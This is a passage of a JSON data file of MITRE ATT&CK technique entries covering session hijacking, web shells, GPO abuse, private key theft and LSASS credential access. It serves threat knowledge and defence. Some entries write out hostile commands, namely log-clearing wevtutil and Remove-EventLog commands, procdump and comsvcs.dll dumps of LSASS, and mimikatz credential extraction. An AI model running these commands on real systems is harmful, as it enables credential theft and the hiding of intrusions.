Access","Collection"],"campaigns":[],"groups":[]},"T1563":{"id":"T1563","name":"Remote Service Session Hijacking","description":"Adversaries may take control of preexisting sessions with remote services to move laterally in an environment. Users may use valid credentials to log into a service specifically designed to accept remote connections, such as telnet, SSH, and RDP. When a user logs into a service, a session will be established that will allow them to maintain a continuous interaction with that service.\n\nAdversaries may commandeer these sessions to carry out actions on remote systems. [Remote Service Session Hijacking](https://attack.mitre.org/techniques/T1563) differs from use of [Remote Services](https://attack.mitre.org/techniques/T1021) because it hijacks an existing session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).^[[1]](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6)^^[[2]](https://matrix.org/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident)^","platforms":["Linux","macOS","Windows"],"tactics":["Lateral Movement"],"campaigns":[],"groups":[]},"T1027.001":{"id":"T1027.001","name":"Binary Padding","description":"Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. \n\nBinary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures.^[[1]](https://www.welivesecurity.com/2018/03/13/oceanlotus-ships-new-backdoor/)^ The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware.^[[2]](https://securelist.com/old-malware-tricks-to-bypass-detection-in-the-age-of-big-data/78010/)^ Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.^[[3]](https://www.virustotal.com/en/faq/)^ ","platforms":["Linux","macOS","Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["FIN7","Gamaredon Group","Leviathan","APT29","Moafee","Higaisa","Patchwork","Ember Bear","BRONZE BUTLER","APT32","Mustang Panda"]},"T1505.003":{"id":"T1505.003","name":"Web Shell","description":"Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.^[[1]](https://www.volexity.com/blog/2022/06/15/driftingcloud-zero-day-sophos-firewall-exploitation-and-an-insidious-breach/)^\n\nIn addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. [China Chopper](https://attack.mitre.org/software/S0020) Web shell client).^[[2]](https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html)^","platforms":["Linux","Windows","macOS","Network"],"tactics":["Persistence"],"campaigns":["C0017","Operation CuckooBees","Operation Wocao"],"groups":["Dragonfly","APT28","OilRig","FIN13","BackdoorDiplomacy","Deep Panda","APT39","Volatile Cedar","GALLIUM","Threat Group-3390","Tropic Trooper","TEMP.Veles","HAFNIUM","Moses Staff","Sandworm Team","Fox Kitten","Tonto Team","Volt Typhoon","APT38","APT29","Magic Hound","APT32","Leviathan","Kimsuky","Operation Wocao","Dragonfly 2.0"]},"T1484.001":{"id":"T1484.001","name":"Group Policy Modification","description":"Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predictable network path `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`.^[[1]](https://blogs.technet.microsoft.com/musings_of_a_technical_tam/2012/02/13/group-policy-basics-part-1-understanding-the-structure-of-a-group-policy-object/)^^[[2]](https://adsecurity.org/?p=2716)^ \n\nLike other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.\n\nMalicious GPO modifications can be used to implement many other malicious behaviors such as [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001), [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105), [Create Account](https://attack.mitre.org/techniques/T1136), [Service Execution](https://attack.mitre.org/techniques/T1569/002),  and more.^[[2]](https://adsecurity.org/?p=2716)^^[[3]](https://wald0.com/?p=179)^^[[4]](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)^^[[5]](https://www.fireeye.com/content/dam/fireeye-www/current-threats/pdfs/rpt-mtrends-2016.pdf)^^[[6]](https://www.microsoft.com/security/blog/2016/06/01/hacking-team-breach-a-cyber-jurassic-park/)^ Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.^[[3]](https://wald0.com/?p=179)^\n\nFor example, publicly available scripts such as `New-GPOImmediateTask` can be leveraged to automate the creation of a malicious [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) by modifying GPO settings, in this case modifying `&lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml`.^[[3]](https://wald0.com/?p=179)^^[[4]](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)^ In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in `&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf`, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.^[[7]](http://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/)^","platforms":["Windows"],"tactics":["Defense Evasion","Privilege Escalation"],"campaigns":[],"groups":["Indrik Spider"]},"T1217":{"id":"T1217","name":"Browser Information Discovery","description":"Adversaries may enumerate information about browsers to learn more about compromised environments. Data saved by browsers (such as bookmarks, accounts, and browsing history) may reveal a variety of personal information about users (e.g., banking sites, relationships/interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.^[[1]](https://www.kaspersky.com/blog/browser-data-theft/27871/)^\n\nBrowser information may also highlight additional targets after an adversary has access to valid credentials, especially [Credentials In Files](https://attack.mitre.org/techniques/T1552/001) associated with logins cached by a browser.\n\nSpecific storage locations vary based on platform and/or application, but browser information is typically stored in local files and databases (e.g., `%APPDATA%/Google/Chrome`).^[[2]](https://support.google.com/chrome/a/answer/7349337)^","platforms":["Linux","Windows","macOS"],"tactics":["Discovery"],"campaigns":[],"groups":["Fox Kitten","APT38","Chimera"]},"T1552.004":{"id":"T1552.004","name":"Private Keys","description":"Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.^[[1]](https://en.wikipedia.org/wiki/Public-key_cryptography)^ Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \n\nAdversaries may also look in common key directories, such as `~/.ssh` for SSH keys on * nix-based systems or `C:&#92;Users&#92;(username)&#92;.ssh&#92;` on Windows. Adversary tools may also search compromised systems for file extensions relating to cryptographic keys and certificates.^[[2]](https://kasperskycontenthub.com/wp-content/uploads/sites/43/vlpdfs/unveilingthemask_v1.0.pdf)^^[[3]](https://researchcenter.paloaltonetworks.com/2016/06/unit42-prince-of-persia-game-over/)^\n\nWhen a device is registered to Azure AD, a device key and a transport key are generated and used to verify the device’s identity.^[[4]](https://learn.microsoft.com/en-us/azure/active-directory/devices/concept-primary-refresh-token)^ An adversary with access to the device may be able to export the keys in order to impersonate the device.^[[5]](https://aadinternals.com/post/deviceidentity/)^\n\nOn network devices, private keys may be exported via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `crypto pki export`.^[[6]](https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/sec_conn_pki/configuration/xe-17/sec-pki-xe-17-book/sec-deploy-rsa-pki.html#GUID-1CB802D8-9DE3-447F-BECE-CF22F5E11436)^ \n\nSome private keys require a password or passphrase for operation, so an adversary may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase off-line. These private keys can be used to authenticate to [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in decrypting other collected files such as email.","platforms":["Linux","macOS","Windows","Network"],"tactics":["Credential Access"],"campaigns":["Operation Wocao","SolarWinds Compromise"],"groups":["TeamTNT","Rocke","UNC2452","APT29","Operation Wocao"]},"T1583.004":{"id":"T1583.004","name":"Server","description":"Adversaries may buy, lease, or rent physical servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control. Adversaries may use web servers to support support watering hole operations, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), or email servers to support [Phishing](https://attack.mitre.org/techniques/T1566) operations. Instead of compromising a third-party [Server](https://attack.mitre.org/techniques/T1584/004) or renting a [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003), adversaries may opt to configure and run their own servers in support of operations.\n\nAdversaries may only need a lightweight setup if most of their activities will take place using online infrastructure. Or, they may need to build extensive infrastructure if they want to test, communicate, and control other aspects of their activities on their own systems.^[[1]](https://www.nytimes.com/2011/01/16/world/middleeast/16stuxnet.html)^","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":["Operation Dream Job","Operation Wocao","Night Dragon","Operation Honeybee"],"groups":["GALLIUM","Kimsuky","Sandworm Team","Earth Lusca","Lazarus Group","Gelsemium"]},"T1021.006":{"id":"T1021.006","name":"Windows Remote Management","description":"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.\n\nWinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services).^[[1]](http://msdn.microsoft.com/en-us/library/aa384426)^ It may be called with the `winrm` command or by any number of programs such as PowerShell.^[[2]](https://www.slideshare.net/kieranjacobsen/lateral-movement-with-power-shell-2)^ WinRM  can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).^[[3]](https://msdn.microsoft.com/en-us/library/aa394582.aspx)^","platforms":["Windows"],"tactics":["Lateral Movement"],"campaigns":["SolarWinds Compromise"],"groups":["FIN13","Chimera","Threat Group-3390","Wizard Spider","APT29","UNC2452"]},"T1011.001":{"id":"T1011.001","name":"Exfiltration Over Bluetooth","description":"Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.\n\nAdversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.","platforms":["Linux","macOS","Windows"],"tactics":["Exfiltration"],"campaigns":[],"groups":[]},"T1078.001":{"id":"T1078.001","name":"Default Accounts","description":"Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS and the default service account in Kubernetes.^[[1]](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts)^^[[2]](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_root-user.html)^^[[3]](https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/)^\n\nDefault accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen [Private Keys](https://attack.mitre.org/techniques/T1552/004) or credential materials to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021).^[[4]](https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/linux/ssh)^","platforms":["Windows","Azure AD","Office 365","SaaS","IaaS","Linux","macOS","Google Workspace","Containers"],"tactics":["Defense Evasion","Persistence","Privilege Escalation","Initial Access"],"campaigns":[],"groups":["FIN13","Magic Hound"]},"T1547.003":{"id":"T1547.003","name":"Time Providers","description":"Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains.^[[1]](https://docs.microsoft.com/windows-server/networking/windows-time-service/windows-time-service-top)^ W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.^[[2]](https://msdn.microsoft.com/library/windows/desktop/ms725475.aspx)^\n\nTime providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of  `HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\`.^[[2]](https://msdn.microsoft.com/library/windows/desktop/ms725475.aspx)^ The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.^[[2]](https://msdn.microsoft.com/library/windows/desktop/ms725475.aspx)^\n\nAdversaries may abuse this architecture to establish persistence, specifically by registering and enabling a malicious DLL as a time provider. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.^[[3]](https://github.com/scottlundgren/w32time)^","platforms":["Windows"],"tactics":["Persistence","Privilege Escalation"],"campaigns":[],"groups":[]},"T1546.005":{"id":"T1546.005","name":"Trap","description":"Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. The `trap` command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like `ctrl+c` and `ctrl+d`.\n\nAdversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following format `trap 'command list' signals` where \"command list\" will be executed when \"signals\" are received.^[[1]](https://ss64.com/bash/trap.html)^^[[2]](https://bash.cyberciti.biz/guide/Trap_statement)^","platforms":["macOS","Linux"],"tactics":["Privilege Escalation","Persistence"],"campaigns":[],"groups":[]},"T1574.006":{"id":"T1574.006","name":"Dynamic Linker Hijacking","description":"Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as `LD_PRELOAD` on Linux or `DYLD_INSERT_LIBRARIES` on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.^[[1]](https://www.man7.org/linux/man-pages/man8/ld.so.8.html)^^[[2]](https://www.tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html)^^[[3]](https://developer.apple.com/library/archive/documentation/DeveloperTools/Conceptual/DynamicLibraries/100-Articles/OverviewOfDynamicLibraries.html)^ These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library.^[[4]](https://www.baeldung.com/linux/ld_preload-trick-what-is)^\n\nOn Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. This method may also evade detection from security products since the execution is masked under a legitimate process. Adversaries can set environment variables via the command line using the `export` command, `setenv` function, or `putenv` function. Adversaries can also leverage [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006) to export variables in a shell or set variables programmatically using higher level syntax such Python’s `os.environ`.\n\nOn Linux, adversaries may set `LD_PRELOAD` to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. `LD_PRELOAD` can be set via the environment variable or `/etc/ld.so.preload` file.^[[1]](https://www.man7.org/linux/man-pages/man8/ld.so.8.html)^^[[2]](https://www.tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html)^ Libraries specified by `LD_PRELOAD` are loaded and mapped into memory by `dlopen()` and `mmap()` respectively.^[[5]](https://www.datawire.io/code-injection-on-linux-and-macos/)^^[[6]](http://hick.org/code/skape/papers/needle.txt)^ ^[[7]](http://phrack.org/issues/51/8.html)^^[[8]](http://www.nth-dimension.org.uk/pub/BTL.pdf)^ \n\nOn macOS this behavior is conceptually the same as on Linux, differing only in how the macOS dynamic libraries (dyld) is implemented at a lower level. Adversaries can set the `DYLD_INSERT_LIBRARIES` environment variable to point to malicious libraries containing names of legitimate libraries or functions requested by a victim program.^[[9]](https://theevilbit.github.io/posts/dyld_insert_libraries_dylib_injection_in_macos_osx_deep_dive/)^^[[10]](https://blog.timac.org/2012/1218-simple-code-injection-using-dyld_insert_libraries/)^^[[11]](https://jon-gabilondo-angulo-7635.medium.com/how-to-inject-code-into-mach-o-apps-part-ii-ddb13ebc8191)^ ","platforms":["Linux","macOS"],"tactics":["Persistence","Privilege Escalation","Defense Evasion"],"campaigns":[],"groups":["Rocke","APT41"]},"T1136.001":{"id":"T1136.001","name":"Local Account","description":"Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. \n\nFor example, with a sufficient level of access, the Windows `net user /add` command can be used to create a local account. On macOS systems the `dscl -create` command can be used to create a local account. Local accounts may also be added to network devices, often via common [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `username`, or to Kubernetes clusters using the `kubectl` utility.^[[1]](https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/security/s1/sec-s1-cr-book/sec-cr-t2.html#wp1047035630)^^[[2]](https://kubernetes.io/docs/concepts/security/service-accounts/)^\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.","platforms":["Linux","macOS","Windows","Network","Containers"],"tactics":["Persistence"],"campaigns":[],"groups":["Wizard Spider","Dragonfly","TeamTNT","Fox Kitten","APT41","FIN13","Kimsuky","Magic Hound","Leafminer","APT39","APT3","Dragonfly 2.0"]},"T1092":{"id":"T1092","name":"Communication Through Removable Media","description":"Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system. Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by [Replication Through Removable Media](https://attack.mitre.org/techniques/T1091). Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.","platforms":["Linux","macOS","Windows"],"tactics":["Command and Control"],"campaigns":[],"groups":["APT28"]},"T1070.001":{"id":"T1070.001","name":"Clear Windows Event Logs","description":"Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\nThe event logs can be cleared with the following utility commands:\n\n* `wevtutil cl system`\n* `wevtutil cl application`\n* `wevtutil cl security`\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command `Remove-EventLog -LogName Security` to delete the Security EventLog and after reboot, disable future logging. Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.^[[1]](https://ptylu.github.io/content/report/report.html?report=25)^","platforms":["Windows"],"tactics":["Defense Evasion"],"campaigns":["Operation Wocao"],"groups":["FIN8","Chimera","APT28","APT41","Indrik Spider","APT38","Dragonfly","APT32","FIN5","Operation Wocao","Dragonfly 2.0"]},"T1585.002":{"id":"T1585.002","name":"Email Accounts","description":"Adversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).^[[1]](https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/mandiant-apt1-report.pdf)^ Adversaries may also take steps to cultivate a persona around the email account, such as through use of [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001), to increase the chance of success of follow-on behaviors. Created email accounts can also be used in the acquisition of infrastructure (ex: [Domains](https://attack.mitre.org/techniques/T1583/001)).^[[1]](https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/mandiant-apt1-report.pdf)^\n\nTo decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services.^[[2]](https://blog.trendmicro.com/trendlabs-security-intelligence/r980-ransomware-disposable-email-service/)^","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":["Operation Honeybee","Operation Wocao","Operation Dream Job","FunnyDream","Operation Dust Storm"],"groups":["Kimsuky","Magic Hound","Mustang Panda","Leviathan","Silent Librarian","EXOTIC LILY","APT1","Wizard Spider","HEXANE","Indrik Spider","Sandworm Team","Lazarus Group"]},"T1557.001":{"id":"T1557.001","name":"LLMNR/NBT-NS Poisoning and SMB Relay","description":"By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials. \n\nLink-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. ^[[1]](https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution)^^[[2]](https://technet.microsoft.com/library/cc958811.aspx)^\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords.\n\nIn some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv1/v2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it.^[[3]](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)^^[[4]](https://blog.secureideas.com/2018/04/ever-run-a-relay-why-smb-relays-should-be-on-your-mind.html)^ Additionally, adversaries may encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB, MSSQL and HTTP, to expand and use multiple services with the valid NTLM response. \n\nSeveral tools may be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174).^[[5]](https://github.com/nomex/nbnspoof)^^[[6]](https://www.rapid7.com/db/modules/auxiliary/spoof/llmnr/llmnr_response)^^[[7]](https://github.com/SpiderLabs/Responder)^","platforms":["Windows"],"tactics":["Credential Access","Collection"],"campaigns":[],"groups":["Lazarus Group","Wizard Spider"]},"T1222":{"id":"T1222","name":"File and Directory Permissions Modification","description":"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.^[[1]](https://www.hybrid-analysis.com/sample/ef0d2628823e8e0a0de3b08b8eacaf41cf284c086a948bdfd67f4e4373c14e4d?environmentId=100)^^[[2]](https://www.hybrid-analysis.com/sample/22dab012c3e20e3d9291bce14a2bfc448036d3b966c6e78167f4626f5f9e38d6?environmentId=110)^ File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory’s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\n\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.^[[3]](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-alphv-rust-ransomware)^^[[4]](https://go.kaspersky.com/rs/802-IJN-240/images/TR_BlackCat_Report.pdf)^^[[5]](https://www.crowdstrike.com/blog/falcon-overwatch-contributes-to-blackcat-protection/)^^[[6]](https://blog.talosintelligence.com/2022/03/from-blackmatter-to-blackcat-analyzing.html)^^[[7]](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-behavior)^ ","platforms":["Linux","Windows","macOS"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1003.001":{"id":"T1003.001","name":"LSASS Memory","description":"Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n* `procdump -ma lsass.exe lsass_dump`\n\nLocally, mimikatz can be run using:\n\n* `sekurlsa::Minidump lsassdump.dmp`\n* `sekurlsa::logonPasswords`\n\nBuilt-in Windows tools such as comsvcs.dll can also be used:\n\n* `rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID  lsass.dmp full`^[[1]](https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/)^^[[2]](https://symantec.broadcom.com/hubfs/Attacks-Against-Government-Sector.pdf)^\n\n\nWindows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: `HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages` and `HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages`. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.^[[3]](http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html)^\n\nThe following SSPs can be used to access credentials:\n\n* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\n* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.^[[4]](https://blogs.technet.microsoft.com/askpfeplat/2016/04/18/the-importance-of-kb2871997-and-kb2928120-for-credential-protection/)^\n* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\n* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.^[[4]](https://blogs.technet.microsoft.com/askpfeplat/2016/04/18/the-importance-of-kb2871997-and-kb2928120-for-credential-protection/)^\n","platforms":["Windows"],"tactics":["Credential Access"],"campaigns":["Operation Wocao","2016 Ukraine Electric Power Attack"],"groups":["Indrik Spider","OilRig","Cleaver","Leafminer","Threat Group-3390","APT1","Leviathan","FIN8","HAFNIUM","Blue Mockingbird","Volt Typhoon","Whitefly","APT33","FIN13","APT32","GALLIUM","BRONZE BUTLER","APT39","Magic Hound","Earth Lusca","PLATINUM","Fox Kitten","Silence","Sandworm Team","MuddyWater","Wizard Spider","Aquatic Panda","Ke3chang","APT3","APT41","FIN6","APT28","Kimsuky","TEMP.Veles","Stolen Pencil","Operation Wocao","Lazarus Group"]},"T1595":{"id":"T1595","name":"Active Scanning","description":"Adversaries may execute active reconnaissance scans to gather information that can be used during targeting. Active scans are those where the adversary probes victim infrastructure via network traffic, as opposed to other forms of reconnaissance that do not involve direct interaction.\n\nAdversaries may perform different forms of active scanning depending on what information they seek to gather. These scans can also be performed in various ways, including using native features of network protocols such as ICMP.^[[1]](https://www.caida.org/publications/papers/2012/analysis_slash_zero/analysis_slash_zero.pdf)^^[[2]](https://wiki.owasp.org/index.php/OAT-004_Fingerprinting)^ Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":[]},"T1548":{"id":"T1548","name":"Abuse Elevation Control Mechanism","description":"Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk. An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.","platforms":["Linux","macOS","Windows","Office 365","IaaS","Google Workspace","Azure AD"],"tactics":["Privilege Escalation","Defense Evasion"],"campaigns":[],"groups":[]},"T1134.002":{"id":"T1134.002","name":"Create Process with Token","description":"Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as `CreateProcessWithTokenW` and `runas`.^[[1]](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11))^\n\nCreating processes with a token not associated with the current user may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used. For example, the token could be duplicated via [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) or created via [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) before being used to create a process.\n\nWhile this technique is distinct from [Token 